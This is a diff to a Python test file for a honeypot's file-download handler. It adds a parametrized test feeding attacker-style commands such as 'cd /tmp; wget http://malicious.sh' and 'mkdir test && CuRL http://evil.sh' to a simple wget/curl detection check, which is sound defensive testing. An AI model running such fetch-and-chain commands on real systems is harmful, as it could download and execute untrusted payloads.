@@ -1,5 +1,8 @@
 from unittest.mock import patch
 
+import pytest
+
+from base_honeypot import HoneypotSession
 from infra.File_download_handler import FileDownloadHandler
 
 
@@ -25,3 +28,18 @@ def test_wget_success(mock_get, tmp_path):
     assert "Downloaded fake.txt" in response
     assert "fake.txt" in session.files
     assert tmp_path.joinpath("fake.txt").read_text() == "fake content"
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "cd /tmp; wget http://malicious.sh",
+        "WGET http://1.2.3.4/payload",
+        "curl -O http://example.com/file",
+        "mkdir test && CuRL http://evil.sh",
+    ],
+)
+def test_file_download_detection(cmd):
+    session = HoneypotSession()
+    detected = "wget" in cmd.lower() or "curl" in cmd.lower()
+    assert detected
